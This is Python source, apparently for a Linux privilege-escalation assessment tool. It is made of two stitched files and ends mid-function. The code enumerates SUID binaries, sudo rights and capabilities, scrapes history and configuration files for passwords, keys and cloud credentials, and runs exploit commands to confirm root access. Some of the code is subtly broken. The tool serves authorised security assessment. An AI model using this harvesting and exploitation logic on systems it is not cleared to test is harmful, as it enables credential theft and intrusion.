#!/usr/bin/env python3
# LPEAssessor - Linux Privilege Escalation Assessment Tool
# Version: 1.3.2
# Author: Tommaso Bona
# License: MIT
# Description: Comprehensive tool for detecting, verifying, and exploiting Linux privilege escalation vulnerabilities.



import os
import sys
import stat
import socket
import platform
import subprocess
import threading
import logging
import argparse
import glob
import json
import time
import re
import pwd
import grp
from datetime import datetime
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("Colorama not found. Installing...")
    subprocess.call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

class LogLevel(Enum):
    INFO = 1
    SUCCESS = 2
    WARNING = 3
    ERROR = 4
    CRITICAL = 5
    DEBUG = 6

class PrivescLogger:
    def __init__(self, log_file=None, verbose=False):
        self.log_file = log_file
        self.verbose = verbose
        self.setup_logger()
    
    def setup_logger(self):
        logging.basicConfig(
            level=logging.DEBUG if self.verbose else logging.INFO,
            format='%(asctime)s - LPEAssessor - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_file) if self.log_file else logging.NullHandler(),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger("LPEAssessor")
    
    def log(self, level, message, show_console=True):
        color_map = {
            LogLevel.INFO: Fore.BLUE,
            LogLevel.SUCCESS: Fore.GREEN,
            LogLevel.WARNING: Fore.YELLOW,
            LogLevel.ERROR: Fore.RED,
            LogLevel.CRITICAL: Fore.RED + Style.BRIGHT,
            LogLevel.DEBUG: Fore.CYAN,
        }
        
        # Log to file if specified
        if level == LogLevel.INFO:
            self.logger.info(message)
        elif level == LogLevel.SUCCESS:
            self.logger.info(f"SUCCESS: {message}")
        elif level == LogLevel.WARNING:
            self.logger.warning(message)
        elif level == LogLevel.ERROR:
            self.logger.error(message)
        elif level == LogLevel.CRITICAL:
            self.logger.critical(message)
        elif level == LogLevel.DEBUG:
            self.logger.debug(message)
        
        # Print to console if show_console is True
        if show_console:
            color = color_map.get(level, "")
            prefix_map = {
                LogLevel.INFO: "[*]",
                LogLevel.SUCCESS: "[+]",
                LogLevel.WARNING: "[!]",
                LogLevel.ERROR: "[x]",
                LogLevel.CRITICAL: "[!!!]",
                LogLevel.DEBUG: "[D]",
            }
            prefix = prefix_map.get(level, "")
            print(f"{color}{prefix} {message}{Style.RESET_ALL}")

class SystemInfo:
    def __init__(self, logger):
        self.logger = logger
        self.info = {}
    
    def gather_system_info(self):
        self.logger.log(LogLevel.INFO, "Gathering system information...")
        
        # Basic system information
        self.info['hostname'] = socket.gethostname()
        self.info['os'] = platform.system()
        self.info['kernel_version'] = platform.release()
        self.info['architecture'] = platform.machine()
        
        # Get current user and groups
        self.info['current_user'] = os.getlogin()
        self.info['user_id'] = os.getuid()
        self.info['group_id'] = os.getgid()
        
        # Get all groups the current user belongs to
        try:
            self.info['groups'] = [g.gr_name for g in grp.getgrall() if self.info['current_user'] in g.gr_mem]
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Failed to get groups: {e}")
            self.info['groups'] = []
        
        # Get all users on the system
        try:
            self.info['system_users'] = [p.pw_name for p in pwd.getpwall()]
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Failed to get system users: {e}")
            self.info['system_users'] = []
        
        # Get system environment variables
        self.info['environment'] = dict(os.environ)
        
        # Get available disk space
        try:
            df_output = subprocess.check_output(["df", "-h"]).decode('utf-8')
            self.info['disk_space'] = df_output
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Failed to get disk space info: {e}")
            self.info['disk_space'] = "Not available"
        
        # Get network interfaces and configurations
        try:
            ip_output = subprocess.check_output(["ip", "addr"]).decode('utf-8')
            self.info['network_interfaces'] = ip_output
        except Exception as e:
            try:
                # Alternative for systems without ip command
                ifconfig_output = subprocess.check_output(["ifconfig"]).decode('utf-8')
                self.info['network_interfaces'] = ifconfig_output
            except Exception as e2:
                self.logger.log(LogLevel.ERROR, f"Failed to get network interfaces: {e2}")
                self.info['network_interfaces'] = "Not available"
        
        # Get listening ports
        try:
            netstat_output = subprocess.check_output(["netstat", "-tuln"]).decode('utf-8')
            self.info['listening_ports'] = netstat_output
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Failed to get listening ports: {e}")
            self.info['listening_ports'] = "Not available"
        
        # Get running processes
        try:
            ps_output = subprocess.check_output(["ps", "aux"]).decode('utf-8')
            self.info['running_processes'] = ps_output
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Failed to get running processes: {e}")
            self.info['running_processes'] = "Not available"
        
        return self.info
    
    def print_system_info(self):
        self.logger.log(LogLevel.INFO, "System Information:")
        for key, value in self.info.items():
            if isinstance(value, dict) or isinstance(value, list) or '\n' in str(value):
                self.logger.log(LogLevel.INFO, f"{key.replace('_', ' ').title()}:")
                
                if isinstance(value, dict):
                    for k, v in value.items():
                        if not str(v).strip():
                            continue
                        self.logger.log(LogLevel.INFO, f"  {k}: {v}")
                elif isinstance(value, list):
                    for item in value:
                        self.logger.log(LogLevel.INFO, f"  {item}")
                else:
                    for line in str(value).split('\n'):
                        if line.strip():
                            self.logger.log(LogLevel.INFO, f"  {line}")
            else:
                self.logger.log(LogLevel.INFO, f"{key.replace('_', ' ').title()}: {value}")

#!/usr/bin/env python3
# vulnerability_verifier.py - Verification framework for LPEAssessor
# To be integrated with main LPEAssessor tool

import os
import stat
import subprocess
import tempfile
import random
import string
import time
import platform
from logging import *
import re
from enum import Enum

class LogLevel(Enum):
    INFO = 1
    SUCCESS = 2
    WARNING = 3
    ERROR = 4
    CRITICAL = 5
    DEBUG = 6

class VulnerabilityVerifier:
    def __init__(self, logger, verification_mode='safe', timeout=10, evidence_dir="/tmp/.lpeassessor_evidence"):
        self.logger = logger
        self.verification_mode = verification_mode  # 'none', 'safe', or 'full'
        self.timeout = timeout  # Timeout for verification attempts
        self.evidence_dir = evidence_dir
        self.success_indicators = []
        
        # Create evidence directory if it doesn't exist
        if verification_mode != 'none':
            os.makedirs(self.evidence_dir, exist_ok=True)
        
    def verify_vulnerability(self, vulnerability, exploit=None):
        """Main method to verify if a vulnerability is exploitable"""
        # Skip verification if in 'none' mode
        if self.verification_mode == 'none':
            return True, "Verification skipped"
            
        vuln_type = vulnerability.get('type', 'unknown')
        method_name = f"verify_{vuln_type}"
        
        # Reset success indicators
        self.success_indicators = []
        
        # Check if we have a specific verification method for this vulnerability type
        if hasattr(self, method_name) and callable(getattr(self, method_name)):
            try:
                verification_result = getattr(self, method_name)(vulnerability, exploit)
                if verification_result:
                    return verification_result
            except Exception as e:
                self.logger.log(LogLevel.ERROR, f"Error verifying {vuln_type}: {e}")
        
        # Fall back to generic verification if no specific method or specific method failed
        return self.generic_verification(vulnerability, exploit)
    
    def generic_verification(self, vulnerability, exploit=None):
        """Generic vulnerability verification method"""
        # Basic permission and existence checks
        if 'path' in vulnerability:
            path = vulnerability.get('path')
            if not os.path.exists(path):
                return False, "Path does not exist"
            
            # Perform basic permission checks based on vulnerability type
            if any(t in vulnerability.get('type', '') for t in ['writable', 'weak_permissions']):
                if not os.access(path, os.W_OK):
                    return False, "No write permissions to path"
            
        # If an exploit is provided and we're in full mode, try to run it
        if exploit and self.verification_mode == 'full':
            return self.verify_with_exploit(vulnerability, exploit)
            
        # Default to true if we couldn't disprove exploitability
        return True, "Potentially exploitable based on euristhic (basic) checks only"
    
    def verify_with_exploit(self, vulnerability, exploit):
        """Verify vulnerability by actually running the exploit"""
        if not exploit or 'command' not in exploit:
            return False, "No exploit command available"
            
        # Generate a unique identifier for this verification
        verification_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        evidence_file = os.path.join(self.evidence_dir, f"evidence_{verification_id}")
        
        # Modify the exploit to create evidence of success
        command = exploit.get('command')
        modified_command = self._create_verification_command(command, evidence_file, vulnerability)
        
        try:
            # Execute the modified exploit command
            self.logger.log(LogLevel.INFO, f"Executing verification command: {modified_command}")
            process = subprocess.Popen(
                modified_command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            try:
                stdout, stderr = process.communicate(timeout=self.timeout)
                exit_code = process.returncode
                
                # Check for evidence of successful exploitation
                success, evidence = self._check_exploitation_evidence(vulnerability, evidence_file, stdout, stderr, exit_code)
                
                if success:
                    self.logger.log(LogLevel.SUCCESS, f"Verification successful: {evidence}")
                    return True, evidence
                else:
                    self.logger.log(LogLevel.WARNING, f"Verification failed: {evidence}")
                    return False, evidence
                    
            except subprocess.TimeoutExpired:
                process.kill()
                return False, f"Verification timed out after {self.timeout} seconds"
                
        except Exception as e:
            return False, f"Error during verification: {str(e)}"
    
    def _create_verification_command(self, command, evidence_file, vulnerability):
        """Modify exploit command to include success evidence creation"""
        # Create a success marker that this command should generate if successful
        success_marker = f"echo 'LPEAssessor verification successful' > {evidence_file}"
        
        vuln_type = vulnerability.get('type', '')
        
        if 'suid_binary' in vuln_type:
            # For SUID exploits, we need to make sure the success marker is executed with elevated privileges
            if 'bash' in command or 'sh' in command:
                # If exploit gives a shell, make it create our evidence file
                return f"{command} -c '{success_marker} && id > {evidence_file}.id'"
            else:
                # Otherwise append our marker command
                return f"{command} && {success_marker}"
        
        elif 'writable_file' in vuln_type or 'weak_file_permissions' in vuln_type:
            # For file modifications, check if the modification was successful
            return f"{command} && {success_marker}"
        
        elif 'sudo' in vuln_type:
            # For sudo exploits, create evidence file as root
            return f"{command} -c '{success_marker} && id > {evidence_file}.id'"
        
        # Generic case
        return f"{command} && {success_marker}"
    
    def _check_exploitation_evidence(self, vulnerability, evidence_file, stdout, stderr, exit_code):
        """Check for evidence of successful exploitation"""
        # Check if our evidence file was created
        if os.path.exists(evidence_file):
            # Additional checks based on vulnerability type
            vuln_type = vulnerability.get('type', '')
            
            if 'suid' in vuln_type or 'sudo' in vuln_type:
                # Check if we got elevated privileges
                if os.path.exists(f"{evidence_file}.id"):
                    with open(f"{evidence_file}.id", 'r') as f:
                        id_output = f.read()
                        if 'uid=0' in id_output or 'root' in id_output:
                            self.success_indicators.append("Obtained root privileges")
                            return True, "Successfully obtained root privileges"
            
            # Generic success case - evidence file exists
            return True, "Exploit successfully executed"
            
        # Check command output for success indicators
        success_patterns = [
            'uid=0', 'root', 'successful', 'success',
            'privileges', 'elevated', 'access granted'
        ]
        
        if any(pattern.lower() in stdout.lower() for pattern in success_patterns):
            success_pattern = next(pattern for pattern in success_patterns if pattern.lower() in stdout.lower())
            self.success_indicators.append(f"Output contained success indicator: {success_pattern}")
            return True, f"Exploit output indicates success: '{success_pattern}'"
        
        # If exit code is 0 and no errors, might be successful
        if exit_code == 0 and not stderr:
            return True, "Exploit command executed successfully with no errors"
            
        # Default to failure
        return False, "No evidence of successful exploitation found"
    
    # Specific verification methods for different vulnerability types
    
    def verify_suid_binary(self, vulnerability, exploit=None):
        """Verify SUID binary vulnerability"""
        path = vulnerability.get('path')
        
        # Check if the binary exists and has SUID bit
        if not os.path.exists(path):
            return False, "Binary does not exist"
            
        try:
            file_stat = os.stat(path)
            if not (file_stat.st_mode & stat.S_ISUID):
                return False, "Binary does not have SUID bit set"
                
            # Check if binary is executable by current user
            if not os.access(path, os.X_OK):
                return False, "Binary is not executable by current user"
                
            binary_name = os.path.basename(path)
            exploit_method = vulnerability.get('exploit_method', '')
            
            if not exploit_method:
                return False, "No known exploit method for this binary"
                
            # If we have an exploit and in full mode, try to run it
            if exploit and self.verification_mode == 'full':
                return self.verify_with_exploit(vulnerability, exploit)
                
            return True, f"SUID binary {binary_name} appears exploitable"
            
        except Exception as e:
            return False, f"Error verifying SUID binary: {str(e)}"
    
    def verify_writable_file(self, vulnerability, exploit=None):
        """Verify writable file vulnerability"""
        path = vulnerability.get('path')
        
        # Check if the file exists
        if not os.path.exists(path):
            return False, "File does not exist"
            
        # Verify that we can actually write to the file
        try:
            # Create a temporary file instead of modifying the actual file
            temp_fd, temp_path = tempfile.mkstemp()
            os.close(temp_fd)
            
            # Try to copy the file to verify read access
            with open(path, 'rb') as src, open(temp_path, 'wb') as dst:
                dst.write(src.read(1))  # Just read first byte to verify
                
            # Try to open the real file in append mode without writing
            with open(path, 'a') as f:
                pass
                
            os.unlink(temp_path)  # Clean up temp file
            
            return True, f"File {path} is verified as writable"
            
        except PermissionError:
            return False, f"Permission denied when attempting to write to {path}"
        except Exception as e:
            return False, f"Error verifying writable file: {str(e)}"
    
    def verify_sudo_permissions(self, vulnerability, exploit=None):
        """Verify sudo permissions vulnerability"""
        cmd = vulnerability.get('command')
        
        try:
            # Check if sudo is available
            subprocess.check_output(['which', 'sudo'])
            
            # Test if we can use sudo without a password
            sudo_test = subprocess.run(['sudo', '-n', 'true'], stderr=subprocess.PIPE, timeout=2)
            can_sudo = sudo_test.returncode == 0
            
            if can_sudo:
                # If we can sudo without password, check if the specific command is allowed
                sudo_output = subprocess.check_output(['sudo', '-l'], stderr=subprocess.STDOUT, timeout=2).decode('utf-8')
                
                # Check if the command appears in the sudo permissions
                if cmd in sudo_output or 'ALL' in sudo_output or '(ALL)' in sudo_output:
                    # If we have an exploit and in full mode, try to run it
                    if exploit and self.verification_mode == 'full':
                        return self.verify_with_exploit(vulnerability, exploit)
                        
                    return True, f"Sudo permission for {cmd} verified"
                    
                return False, f"Command {cmd} not found in sudo permissions"
                
            return False, "User cannot use sudo without a password"
            
        except subprocess.CalledProcessError:
            return False, "Sudo is not available or user doesn't have sudo rights"
        except Exception as e:
            return False, f"Error verifying sudo permissions: {str(e)}"
            
    def verify_path_hijacking(self, vulnerability, exploit=None):
        """Verify PATH hijacking vulnerability"""
        command = vulnerability.get('command')
        writable_directory = vulnerability.get('writable_directory')
        
        if not command or not writable_directory:
            return False, "Missing command or writable directory information"
            
        # Check if directory exists and is writable
        if not os.path.exists(writable_directory):
            return False, "Directory does not exist"
            
        if not os.access(writable_directory, os.W_OK):
            return False, "Directory is not writable"
            
        # Check if directory is in PATH
        path_env = os.environ.get('PATH', '')
        path_dirs = path_env.split(':')
        
        if writable_directory not in path_dirs:
            return False, "Directory not in PATH"
            
        # Verify that we can create a file with the command name
        try:
            cmd_path = os.path.join(writable_directory, command)
            
            # If the file already exists, check if it's writable
            if os.path.exists(cmd_path):
                if not os.access(cmd_path, os.W_OK):
                    return False, f"Cannot write to existing command file: {cmd_path}"
            else:
                # Try to create a temporary file to verify write access
                try:
                    with open(cmd_path, 'w') as f:
                        f.write("#!/bin/sh\necho test\n")
                    os.chmod(cmd_path, 0o755)
                    os.unlink(cmd_path)  # Clean up
                except Exception as e:
                    return False, f"Cannot create command file: {e}"
            
            # Find the real command location
            real_cmd_path = None
            for path_dir in path_dirs:
                if path_dir == writable_directory:
                    continue  # Skip our writable directory
                    
                potential_path = os.path.join(path_dir, command)
                if os.path.exists(potential_path) and os.path.isfile(potential_path):
                    real_cmd_path = potential_path
                    break
                    
            # Check PATH order
            if real_cmd_path:
                writable_index = path_dirs.index(writable_directory)
                real_dir = os.path.dirname(real_cmd_path)
                real_dir_index = path_dirs.index(real_dir)
                
                if writable_index >= real_dir_index:
                    return False, f"Writable directory comes after real command in PATH"
            
            # If we have an exploit and in full mode, try to run it
            if exploit and self.verification_mode == 'full':
                return self.verify_with_exploit(vulnerability, exploit)
                
            return True, f"PATH hijacking for {command} appears exploitable"
            
        except Exception as e:
            return False, f"Error verifying PATH hijacking: {str(e)}"


class VulnerabilityScanner:
    def __init__(self, logger, username=None, threads=10, scan_timeout=3600, verification_mode='safe', verify_timeout=10):
        self.logger = logger
        self.username = username
        self.threads = threads
        self.scan_timeout = scan_timeout
        self.vulnerabilities = []
        self.exclude_paths = ['/proc', '/sys', '/dev', '/run', '/snap']
        self.verification_mode = verification_mode
        self.verify_timeout = verify_timeout
        
        # Initialize the verifier if needed
        if verification_mode != 'none':
            self.verifier = VulnerabilityVerifier(
                logger=logger,
                verification_mode=verification_mode,
                timeout=verify_timeout
        )
    
    def start_scan(self):
        """Main method to start vulnerability scanning with improved thread management"""
        self.logger.log(LogLevel.INFO, "Starting vulnerability scan...")

        scan_methods = [
            self.scan_suid_binaries,
            self.scan_sgid_binaries,
            self.scan_writable_files,
            self.scan_world_writable_directories,
            self.scan_weak_file_permissions,
            self.scan_docker_group,
            self.scan_weak_credentials,
            self.scan_kernel_exploits,
            self.scan_scheduled_tasks,
            self.scan_sudo_permissions,
            self.scan_exposed_services,
            self.scan_path_hijacking,
            # LinPEAS-style methods
            self.scan_history_files,
            self.scan_ssh_files,
            self.scan_interesting_files,
            self.scan_capabilities,
            self.scan_containers
        ]

        # Run each method with individual timeout
        for method in scan_methods:
            method_name = method.__name__
            self.logger.log(LogLevel.INFO, f"Starting {method_name}...")
        
            thread = threading.Thread(target=method)
            thread.daemon = True
            thread.start()
        
            method_timeout = min(300, self.scan_timeout / len(scan_methods))
            thread.join(timeout=method_timeout)
        
            if thread.is_alive():
                self.logger.log(LogLevel.WARNING, f"{method_name} timed out after {method_timeout} seconds, continuing with next scan")

        # Verify discovered vulnerabilities if verification is enabled
        if self.verification_mode != 'none':
            self.logger.log(LogLevel.INFO, f"Verifying discovered vulnerabilities in {self.verification_mode} mode...")
            verified_vulnerabilities = []
            
            for vuln in self.vulnerabilities:
                vuln_type = vuln.get('type', 'unknown')
                self.logger.log(LogLevel.INFO, f"Verifying {vuln_type} vulnerability...")
                
                # Skip verification for vulnerabilities already marked as unexploitable
                if vuln.get('is_exploitable') is False:
                    verified_vulnerabilities.append(vuln)
                    continue
                    
                # Verify the vulnerability
                is_exploitable, reason = self.verifier.verify_vulnerability(vuln)
                
                # Update the vulnerability with verification results
                vuln['is_exploitable'] = is_exploitable
                vuln['verification_reason'] = reason
                
                if is_exploitable:
                    self.logger.log(LogLevel.SUCCESS, f"Verification succeeded: {reason}")
                else:
                    self.logger.log(LogLevel.WARNING, f"Verification failed: {reason}")
                    
                verified_vulnerabilities.append(vuln)
            
            # Replace the vulnerabilities list with verified vulnerabilities
            self.vulnerabilities = verified_vulnerabilities
            self.logger.log(LogLevel.INFO, f"Verification complete: {sum(1 for v in self.vulnerabilities if v.get('is_exploitable', False))} exploitable vulnerabilities confirmed")

        return self.vulnerabilities
    
    def scan_history_files(self):
        """Scan for sensitive information in history files (LinPEAS-style)"""
        self.logger.log(LogLevel.INFO, "Scanning history files for sensitive information...")
        
        # Common history files to check
        history_files = [
            '~/.bash_history',
            '~/.zsh_history',
            '~/.python_history',
            '~/.mysql_history',
            '~/.psql_history',
            '/.ash_history',
            '~/.history',
            '~/.sh_history'
        ]
        
        # Patterns to look for
        sensitive_patterns = [
            r'(?i)passwd',
            r'(?i)ssh-add',
            r'(?i)ssh\s+.*\s+\-i',
            r'(?i)curl\s+.*\s+\-u\s+[^\s]+:[^\s]+',
            r'(?i)wget\s+.*\s+\-\-password',
            r'(?i)mysql\s+\-u\s+root\s+\-p',
            r'(?i)psql\s+\-U\s+[^\s]+\s+\-W',
            r'(?i)dump(db|sql)',
            r'(?i)auth(entication)?\.json',
            r'(?i)id_rsa',
            r'(?i)\.key',
            r'(?i)\.crt'
        ]
        
        for history_file in history_files:
            expanded_path = os.path.expanduser(history_file)
            if os.path.exists(expanded_path) and os.access(expanded_path, os.R_OK):
                try:
                    with open(expanded_path, 'r', errors='ignore') as f:
                        content = f.read()
                        
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content)
                        if matches:
                            vuln = {
                                'type': 'history_file_exposure',
                                'path': expanded_path,
                                'pattern': pattern,
                                'matches': matches[:5],  # Limit to first 5 matches
                                'is_exploitable': True
                            }
                            
                            self.logger.log(LogLevel.SUCCESS, f"Found sensitive information in history file: {expanded_path}")
                            self.logger.log(LogLevel.INFO, f"  Pattern: {pattern}")
                            self.logger.log(LogLevel.INFO, f"  Matches: {', '.join(matches[:5])}")
                            
                            self.vulnerabilities.append(vuln)
                except Exception as e:
                    self.logger.log(LogLevel.DEBUG, f"Error reading history file {expanded_path}: {e}")

    def scan_ssh_files(self):
        """Scan for SSH keys with weak permissions (LinPEAS-style)"""
        self.logger.log(LogLevel.INFO, "Scanning for SSH keys with weak permissions...")
        
        # Look for SSH key files
        ssh_locations = [
            '~/.ssh',
            '/etc/ssh',
            '/home/*/.ssh',
            '/root/.ssh'
        ]
        
        ssh_files = []
        for location in ssh_locations:
            expanded_path = os.path.expanduser(location)
            try:
                if os.path.isdir(expanded_path):
                    for root, dirs, files in os.walk(expanded_path):
                        for filename in files:
                            if filename in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'identity', 'authorized_keys', 'known_hosts']:
                                ssh_files.append(os.path.join(root, filename))
                elif os.path.isfile(expanded_path) and os.access(expanded_path, os.R_OK):
                    ssh_files.append(expanded_path)
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error accessing SSH location {location}: {e}")
        
        for ssh_file in ssh_files:
            try:
                # Check permissions
                if os.access(ssh_file, os.R_OK):
                    file_stat = os.stat(ssh_file)
                    file_perms = oct(file_stat.st_mode)[-4:]
                    
                    # SSH private keys should have 0600 permissions
                    is_private_key = any(key_type in ssh_file for key_type in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'identity'])
                    is_overly_permissive = False
                    
                    if is_private_key and file_perms != '0600':
                        is_overly_permissive = True
                        
                    # SSH config file should have 0644 permissions at most
                    is_config = 'config' in ssh_file
                    if is_config and int(file_perms[-3:], 8) > 644:
                        is_overly_permissive = True
                    
                    if is_overly_permissive:
                        # Get ownership information
                        try:
                            owner = pwd.getpwuid(file_stat.st_uid).pw_name
                        except:
                            owner = str(file_stat.st_uid)
                        
                        try:
                            group = grp.getgrgid(file_stat.st_gid).gr_name
                        except:
                            group = str(file_stat.st_gid)
                        
                        vuln = {
                            'type': 'ssh_key_weak_permissions',
                            'path': ssh_file,
                            'permissions': file_perms,
                            'owner': owner,
                            'group': group,
                            'is_private_key': is_private_key,
                            'is_exploitable': True
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, f"Found SSH {'private key' if is_private_key else 'file'} with weak permissions: {ssh_file}")
                        self.logger.log(LogLevel.INFO, f"  Permissions: {file_perms}, Expected: {'0600' if is_private_key else '0644 or less'}")
                        
                        self.vulnerabilities.append(vuln)
                        
                    # Check if this is a private key and we can read it
                    if is_private_key and os.access(ssh_file, os.R_OK):
                        vuln = {
                            'type': 'readable_ssh_private_key',
                            'path': ssh_file,
                            'owner': owner if 'owner' in locals() else 'unknown',
                            'is_exploitable': True
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, f"Found readable SSH private key: {ssh_file}")
                        self.vulnerabilities.append(vuln)
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking SSH file {ssh_file}: {e}")

    def scan_interesting_files(self):
        """Scan for interesting files that might contain sensitive information (LinPEAS-style)"""
        self.logger.log(LogLevel.INFO, "Scanning for interesting files with sensitive information...")
        
        # Files that might contain interesting information
        interesting_files = [
            '/etc/fstab',
            '/etc/mtab',
            '/etc/exports',
            '/var/mail/*',
            '/var/spool/mail/*',
            '/var/spool/cron/*',
            '/var/backup/*',
            '/var/www/html/wp-config.php',
            '/var/www/html/config.php',
            '/etc/httpd/conf/httpd.conf',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/etc/nginx/sites-enabled/*',
            '/etc/supervisor/conf.d/*',
            '~/.aws/credentials',
            '~/.aws/config',
            '~/.git-credentials',
            '~/.gitconfig',
            '~/.docker/config.json',
            '/etc/letsencrypt/live/*'
        ]
        
        for interesting_file in interesting_files:
            try:
                expanded_path = os.path.expanduser(interesting_file)
                # Handle wildcards in paths
                if '*' in expanded_path:
                    matching_files = glob.glob(expanded_path)
                    for match in matching_files:
                        self._check_interesting_file(match)
                elif os.path.exists(expanded_path):
                    self._check_interesting_file(expanded_path)
            except Exception as e:
                self.logger.log(LogLevel.DEBUG, f"Error checking interesting file {interesting_file}: {e}")
        
    def _check_interesting_file(self, file_path):
        """Check if a file contains sensitive information or has weak permissions"""
        try:
            if os.path.isfile(file_path) and os.access(file_path, os.R_OK):
                file_stat = os.stat(file_path)
                
                # Get ownership information
                try:
                    owner = pwd.getpwuid(file_stat.st_uid).pw_name
                except:
                    owner = str(file_stat.st_uid)
                
                try:
                    group = grp.getgrgid(file_stat.st_gid).gr_name
                except:
                    group = str(file_stat.st_gid)
                
                # Check for sensitive patterns if the file is readable
                with open(file_path, 'r', errors='ignore') as f:
                    # Read only a portion of the file to avoid large files
                    content = f.read(10000)
                    
                    # Check for sensitive patterns
                    sensitive_found = False
                    sensitive_matches = []
                    
                    # Patterns to look for in interesting files
                    sensitive_patterns = [
                        r'(?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)secret\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)key\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)pass\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)username\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)credential\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)database\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)token\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)api[_\s]?key\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
                        r'(?i)ftp',
                        r'(?i)jdbc',
                        r'(?i)ssh',
                        r'PRIVATE KEY'
                    ]
                    
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content)
                        if matches:
                            sensitive_found = True
                            sensitive_matches.extend([match for match in matches if match])
                    
                    if sensitive_found:
                        vuln = {
                            'type': 'sensitive_info_exposure',
                            'path': file_path,
                            'owner': owner,
                            'group': group,
                            'permissions': oct(file_stat.st_mode)[-4:],
                            'sensitive_matches': sensitive_matches[:5],  # Limit to first 5 matches
                            'is_exploitable': True
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, f"Found sensitive information in: {file_path}")
                        for match in sensitive_matches[:5]:
                            self.logger.log(LogLevel.INFO, f"  Match: {match}")
                        
                        self.vulnerabilities.append(vuln)
        except Exception as e:
            self.logger.log(LogLevel.DEBUG, f"Error checking interesting file {file_path}: {e}")

    def scan_capabilities(self):
        """Scan for binaries with dangerous capabilities (LinPEAS-style)"""
        self.logger.log(LogLevel.INFO, "Scanning for binaries with dangerous capabilities...")
        
        try:
            # Check if getcap command is available
            if self._command_exists('getcap'):
                # Run getcap to find all binaries with capabilities
                getcap_output = subprocess.check_output(['getcap', '-r', '/', '2>/dev/null'], 
                                                    shell=True, stderr=subprocess.PIPE).decode('utf-8')
                
                # Dangerous capabilities
                dangerous_caps = [
                    'cap_setuid', 'cap_setgid', 'cap_dac_override', 
                    'cap_dac_read_search', 'cap_sys_admin', 'cap_sys_ptrace',
                    'cap_chown', 'cap_fowner', 'cap_sys_module'
                ]
                
                for line in getcap_output.split('\n'):
                    if not line.strip():
                        continue
                        
                    # Parse the line to get binary path and capabilities
                    parts = line.split(' ', 1)
                    if len(parts) != 2:
                        continue
                        
                    binary_path, capabilities = parts
                    
                    # Check if any dangerous capability is present
                    is_dangerous = any(cap in capabilities for cap in dangerous_caps)
                    
                    if is_dangerous:
                        vuln = {
                            'type': 'dangerous_capability',
                            'path': binary_path,
                            'capabilities': capabilities,
                            'is_exploitable': True
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, f"Found binary with dangerous capabilities: {binary_path}")
                        self.logger.log(LogLevel.INFO, f"  Capabilities: {capabilities}")
                        
                        self.vulnerabilities.append(vuln)
        except Exception as e:
            self.logger.log(LogLevel.DEBUG, f"Error scanning for capabilities: {e}")
        
    def _command_exists(self, command):
        """Check if a command exists in the system"""
        try:
            subprocess.check_output(['which', command], stderr=subprocess.PIPE)
            return True
        except:
            return False

    def scan_containers(self):
        """Scan for container-related vulnerabilities (LinPEAS-style)"""
        self.logger.log(LogLevel.INFO, "Scanning for container-related vulnerabilities...")
        
        # Check for Docker socket
        docker_socket = '/var/run/docker.sock'
        if os.path.exists(docker_socket) and os.access(docker_socket, os.R_OK):
            vuln = {
                'type': 'accessible_docker_socket',
                'path': docker_socket,
                'is_exploitable': True
            }
            
            self.logger.log(LogLevel.SUCCESS, f"Found accessible Docker socket: {docker_socket}")
            self.logger.log(LogLevel.INFO, "  This can be exploited to escape container or gain privileges")
            
            self.vulnerabilities.append(vuln)
        
        # Check for .dockerenv file (indicates we're in a container)
        if os.path.exists('/.dockerenv'):
            vuln = {
                'type': 'inside_docker_container',
                'path': '/.dockerenv',
                'is_exploitable': False  # Not directly exploitable, but useful information
            }
            
            self.logger.log(LogLevel.INFO, "Running inside a Docker container")
            self.vulnerabilities.append(vuln)
        
        # Check container capabilities and security profiles
        try:
            if os.path.exists('/proc/self/status'):
                with open('/proc/self/status', 'r') as f:
                    status_content = f.read()
                    
                    # Check for privileged container (all capabilities)
                    if 'CapEff:\t0000003fffffffff' in status_content or 'CapEff:\t0000001fffffffff' in status_content:
                        vuln = {
                            'type': 'privileged_container',
                            'capabilities': 'All capabilities enabled',
                            'is_exploitable': True
                        }
                        
                        self.logger.log(LogLevel.SUCCESS, "Container is running in privileged mode!")
                        self.logger.log(LogLevel.INFO, "  This can be exploited to escape the container")
                        
                        self.vulnerabilities.append(vuln)
        except Exception as e:
            self.logger.log(LogLevel.DEBUG, f"Error checking container capabilities: {e}")
    
    def scan_suid_binaries(self):
        """Scan for SUID binaries that can be exploited with verification"""
        self.logger.log(LogLevel.INFO, "Scanning for SUID binaries...")
        suid_binaries = []
        
        # Common SUID binaries that can be used for privilege escalation
